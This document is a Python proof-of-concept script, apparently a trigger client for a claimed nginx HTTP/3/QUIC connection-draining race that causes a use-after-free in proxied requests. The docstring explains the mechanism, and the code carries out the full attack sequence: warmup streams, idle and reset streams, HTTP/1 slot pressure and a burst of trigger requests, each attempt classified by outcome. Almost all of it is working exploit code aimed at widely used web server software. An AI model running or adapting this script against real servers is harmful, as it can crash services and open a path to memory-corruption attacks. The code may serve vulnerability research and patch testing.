#!/usr/bin/env python3
"""CVE-2026-121810 trigger client — HTTP/3/QUIC connection-draining race.

Mechanism under test (nginx 1.25.0..1.31.8): ngx_quic_create_stream()
un-queues the parent QUIC connection (ngx_reusable_connection(c, 0))
BEFORE allocating the stream's worker_connections slot
(ngx_get_connection), and inserts the stream into the parent's rbtree
only AFTER the slot exists. ngx_get_connection() runs
ngx_drain_connections() on every allocation; if that drain closes a
same-parent stream whose close reaches ngx_quic_close_stream()'s
reusable re-mark (ngx_quic_can_shutdown() cannot see the being-created
stream -> tree looks empty -> parent marked reusable mid-create), the
parent ends up reusable WITH an active stream. When that stream's
request later hits ngx_event_connect_peer (proxy_pass), its
ngx_get_connection drain can close the now-reusable parent; the QUIC
close frees the in-flight request pool (upstream u / u->peer) while
ngx_event_connect_peer keeps using it — the use-after-free.

Client-side ingredients (all knob-controlled):
  - one QUIC parent with completed GETs (finished streams / zombies
    waiting for ACK retirement) — the can_shutdown population,
  - idle streams (partial request byte, no FIN): stream connections
    sit reusable-marked (ngx_http_v3_wait_request_handler NGX_AGAIN),
    in the parent rbtree, holding slots — the drain's targets,
  - FIN-only idles (request bytes fully arrived, FIN set, handler not
    yet run): recv_state != RECV while still reusable — gate-passing
    close candidates,
  - RST-aborted streams: recv_state = RESET_RECVD zombies,
  - h1 keepalive connections on the same worker (slot pressure that is
    itself reusable-marked),
  - the trigger: a NEW stream carrying a complete proxied GET.

Every attempt runs under hard timeouts (asyncio.wait_for + a SIGALRM
watchdog); aioquic owns the UDP socket inside asyncio transports, the
h1 pressure uses asyncio streams. Classification per attempt:
TRIGGER-OK / CONN-DIED / TIMEOUT. Exit code is always 0 — this is a
probe; the evidence of record is the server log (ASAN report / worker
death lines), not this exit code.
"""

import argparse
import asyncio
import signal
import ssl
import sys
import time

from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import DataReceived, HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import ConnectionTerminated
from aioquic.quic.packet import QuicProtocolVersion


class H3Client(QuicConnectionProtocol):
    """QuicConnectionProtocol with an H3 layer and per-stream waiters."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._h3 = H3Connection(self._quic)
        self._streams = {}      # stream_id -> {"fut": Future, "body": b"", "status": None}
        self._terminated = None
        self._waiters = set()

    @staticmethod
    def _quiet(fut):
        # consume exceptions of futures nobody awaits (idle streams)
        if not fut.cancelled():
            fut.exception()

    def quic_event_received(self, event):
        if isinstance(event, ConnectionTerminated):
            self._terminated = event
            for st in self._streams.values():
                if not st["fut"].done():
                    st["fut"].set_exception(RuntimeError(
                        f"quic terminated: {event.error_code} {event.frame_type} "
                        f"{event.reason_phrase!r}"))
            return
        for ev in self._h3.handle_event(event):
            sid = getattr(ev, "stream_id", None)
            if sid is None or sid not in self._streams:
                continue
            st = self._streams[sid]
            if isinstance(ev, HeadersReceived):
                for k, v in ev.headers:
                    if k == b":status":
                        st["status"] = v.decode()
            if isinstance(ev, DataReceived):
                st["body"] += ev.data
            if getattr(ev, "stream_ended", False) and not st["fut"].done():
                st["fut"].set_result(True)

    # ---- helpers ----------------------------------------------------

    def new_stream(self):
        sid = self._quic.get_next_available_stream_id()
        fut = asyncio.get_running_loop().create_future()
        fut.add_done_callback(self._quiet)
        self._streams[sid] = {"fut": fut, "body": b"", "status": None}
        return sid

    def send_request(self, sid, path, end_stream=True):
        self._h3.send_headers(
            sid,
            [(b":method", b"GET"), (b":scheme", b"https"),
             (b":authority", b"lab"), (b":path", path.encode())],
            end_stream=end_stream)
        self.transmit()

    def send_partial(self, sid, n=1):
        """Open/hold a stream with an incomplete request byte (no FIN):
        0x01 is the first byte of an H3 HEADERS frame with the length
        still missing, so the request parse returns NGX_AGAIN and the
        stream connection sits reusable-marked in
        ngx_http_v3_wait_request_handler (a 0x00 DATA-first byte would be
        a protocol error and get the stream reset immediately)."""
        self._quic.send_stream_data(sid, b"\x01" * n, end_stream=False)
        self.transmit()

    def send_fin(self, sid):
        """FIN-only frame: request bytes fully arrived (recv_state !=
        RECV) while the request handler may still be pending."""
        self._quic.send_stream_data(sid, b"", end_stream=True)
        self.transmit()

    def rst(self, sid, code=0):
        self._quic.reset_stream(sid, code)
        self.transmit()

    @property
    def terminated(self):
        return self._terminated


async def wait_stream(proto, sid, timeout):
    st = proto._streams[sid]
    return await asyncio.wait_for(st["fut"], timeout)


async def h1_open(host, port, n):
    """n keepalive h1 connections: send one GET, read the response, then
    leave them idle (reusable-marked server-side, holding slots)."""
    conns = []
    for _ in range(n):
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port), 3)
            w.write(b"GET /health HTTP/1.1\r\nHost: lab\r\nConnection: keep-alive\r\n\r\n")
            await asyncio.wait_for(w.drain(), 3)
            await asyncio.wait_for(r.readexactly(64), 3)  # headers+body are tiny; partial ok
            conns.append((r, w))
        except Exception:
            pass
    return conns


async def h1_close(conns):
    for r, w in conns:
        try:
            w.close()
        except Exception:
            pass


async def h1_refill(host, port, target, pool, period=0.2):
    """Keep ~target h1 keepalive connections open in `pool`: the server's
    drains close them, we reopen — every accept is another
    ngx_get_connection racing a low-free pool, keeping free_connection_n
    pinned at the drain threshold (connection_n/16) for the whole
    attempt. Conns are never closed here, not even on cancel (closing
    them would free the slots and evaporate the pressure); the caller's
    cleanup owns them."""
    try:
        while True:
            if len(pool) < target:
                pool.extend(await h1_open(host, port, target - len(pool)))
            await asyncio.sleep(period)
    except asyncio.CancelledError:
        raise


async def h1_fetch(host, port, path, timeout=3):
    r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
    try:
        w.write(f"GET {path} HTTP/1.1\r\nHost: lab\r\nConnection: close\r\n\r\n".encode())
        await asyncio.wait_for(w.drain(), timeout)
        data = await asyncio.wait_for(r.read(), timeout)
        return data.decode(errors="replace")
    finally:
        w.close()


async def one_attempt(idx, args):
    """One full race attempt on a fresh parent QUIC connection."""
    host, port = args.target.split(":")
    h1host, h1port = args.h1_target.split(":")
    t0 = time.monotonic()
    verdict = "TIMEOUT"
    detail = ""
    h1 = []
    refill = None
    try:
        config = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN,
                                   verify_mode=ssl.CERT_NONE)
        async def run():
            nonlocal verdict, detail, refill
            async with connect(host, int(port), configuration=config,
                               create_protocol=H3Client,
                               local_port=0) as proto:
                # -- warmup: completed GETs (finished-stream population)
                for _ in range(args.gets):
                    sid = proto.new_stream()
                    proto.send_request(sid, "/health")
                    try:
                        await wait_stream(proto, sid, 5)
                    except Exception as e:
                        detail = f"warmup: {e!r}"
                        return
                if args.gets:
                    await asyncio.sleep(args.settle / 1000)

                # -- pressure: h1 keepalive refiller keeps the pool at
                # the drain edge; idle streams on this parent are the
                # same-parent drain targets (re-marked to the queue TAIL
                # right before the trigger).
                refill = asyncio.create_task(
                    h1_refill(h1host, int(h1port), args.h1, h1))
                idle = []
                for _ in range(args.idle):
                    sid = proto.new_stream()
                    proto.send_partial(sid)
                    idle.append(sid)
                for _ in range(args.idle_fin):
                    sid = proto.new_stream()
                    proto.send_partial(sid)
                    proto.send_fin(sid)
                    idle.append(sid)
                if args.abort:
                    await asyncio.sleep(0.05)
                    for _ in range(args.abort):
                        sid = proto.new_stream()
                        proto.send_partial(sid)
                        proto.rst(sid)

                if args.jitter:
                    import random
                    await asyncio.sleep(random.uniform(0, args.jitter) / 1000)

                # -- remark pass: one more partial byte per idle re-triggers
                # wait_request NGX_AGAIN -> the server re-marks those
                # conns reusable NOW, putting same-parent idles at the
                # queue TAIL ahead of the h1 marks from the last refill
                # tick. The refiller keeps running so free_connection_n
                # stays pinned at the drain threshold through the trigger.
                for sid in idle:
                    proto.send_partial(sid)
                await asyncio.sleep(0.02)

                if args.stub:
                    try:
                        s = await h1_fetch(h1host, int(h1port), "/stub_status")
                        body = s.split("\r\n\r\n", 1)[-1]
                        print(f"    [attempt {idx}] stub: "
                              + " ".join(body.split()), flush=True)
                    except Exception as e:
                        print(f"    [attempt {idx}] stub failed: {e!r}", flush=True)

                await asyncio.sleep(args.gap / 1000)

                # -- trigger: burst of new streams, each a complete
                # proxied GET — every create is a window, every
                # ngx_event_connect_peer a second drain. burst_gap
                # spreads the burst so later creates land AFTER the
                # ~25 ms ACK retirement of idles drained by earlier
                # creates (those retirements re-mark the parent via
                # ngx_quic_close_stream's can_shutdown check).
                for i in range(args.burst):
                    sid = proto.new_stream()
                    proto.send_request(sid, args.path)
                    if i + 1 < args.burst:
                        await asyncio.sleep(args.burst_gap / 1000)
                try:
                    await wait_stream(proto, sid, args.resp_timeout)
                    verdict = "TRIGGER-OK"
                except asyncio.TimeoutError:
                    verdict = "TIMEOUT"
                except Exception as e:
                    verdict = "CONN-DIED"
                    detail = f"trigger: {e!r}"

                # -- optional second trigger while the first is in flight
                if args.trigger2 and verdict == "TRIGGER-OK":
                    sid = proto.new_stream()
                    proto.send_request(sid, args.path)
                    try:
                        await wait_stream(proto, sid, args.resp_timeout)
                    except Exception as e:
                        detail += f" / trigger2: {e!r}"

        await asyncio.wait_for(run(), args.attempt_timeout)
    except asyncio.TimeoutError:
        verdict = "TIMEOUT"
        detail = "attempt watchdog"
    except Exception as e:
        verdict = "CONN-DIED" if "terminated" in repr(e) else "ERROR"
        detail = repr(e)
    finally:
        if refill is not None:
            refill.cancel()
            try:
                await refill
            except asyncio.CancelledError:
                pass
        await h1_close(h1)
    ms = (time.monotonic() - t0) * 1000
    return verdict, f"{ms:.0f}ms {detail}"


async def main():
    ap = argparse.ArgumentParser(description="CVE-2026-121810 QUIC drain race trigger")
    ap.add_argument("--target", default="vuln:443", help="host:udp-port of the h3 listener")
    ap.add_argument("--h1-target", default=None,
                    help="host:port of the plain h1 listener on the same worker "
                         "(default: <target host>:8080)")
    ap.add_argument("--path", default="/proxied",
                    help="trigger path (/proxied reachable upstream, /refused instant ECONNREFUSED)")
    ap.add_argument("--gets", type=int, default=8, help="completed warmup GETs on the parent")
    ap.add_argument("--idle", type=int, default=0, help="idle partial-request streams (no FIN)")
    ap.add_argument("--idle-fin", type=int, default=0, help="idle streams with FIN-only after partial byte")
    ap.add_argument("--abort", type=int, default=0, help="streams opened then RST immediately")
    ap.add_argument("--h1", type=int, default=0, help="h1 keepalive pressure connections")
    ap.add_argument("--trigger2", action="store_true", help="(unused; --burst supersedes it)")
    ap.add_argument("--burst", type=int, default=1,
                    help="trigger streams fired back-to-back")
    ap.add_argument("--burst-gap", type=float, default=30,
                    help="ms between burst trigger streams")
    ap.add_argument("--jitter", type=float, default=0,
                    help="random 0..jitter ms pause between pressure and trigger")
    ap.add_argument("--stub", action="store_true",
                    help="dump stub_status slot accounting before the trigger")
    ap.add_argument("--settle", type=int, default=50, help="ms to settle after warmup GETs")
    ap.add_argument("--gap", type=int, default=0, help="ms between pressure and the trigger")
    ap.add_argument("--repeat", type=int, default=1, help="attempts (fresh parent each)")
    ap.add_argument("--resp-timeout", type=float, default=5.0)
    ap.add_argument("--attempt-timeout", type=float, default=30.0)
    ap.add_argument("--watchdog", type=int, default=110,
                    help="hard SIGALRM watchdog for the whole run (s)")
    args = ap.parse_args()
    if args.h1_target is None:
        args.h1_target = f"{args.target.split(':')[0]}:8080"

    def _alarm(sig, frame):
        raise TimeoutError("SIGALRM watchdog")

    signal.signal(signal.SIGALRM, _alarm)
    signal.alarm(args.watchdog)

    counts = {}
    try:
        for i in range(args.repeat):
            v, detail = await one_attempt(i, args)
            counts[v] = counts.get(v, 0) + 1
            print(f"[attempt {i}] {v} {detail}", flush=True)
            if v in ("CONN-DIED",):
                # a death mid-attempt invalidates the parent; small pause
                # lets the (respawned) worker settle before the next try
                await asyncio.sleep(1.0)
    except TimeoutError:
        print("WATCHDOG-EXPIRED", flush=True)
    finally:
        signal.alarm(0)

    print("SUMMARY " + " ".join(f"{k}={v}" for k, v in sorted(counts.items())), flush=True)


if __name__ == "__main__":
    asyncio.run(main())
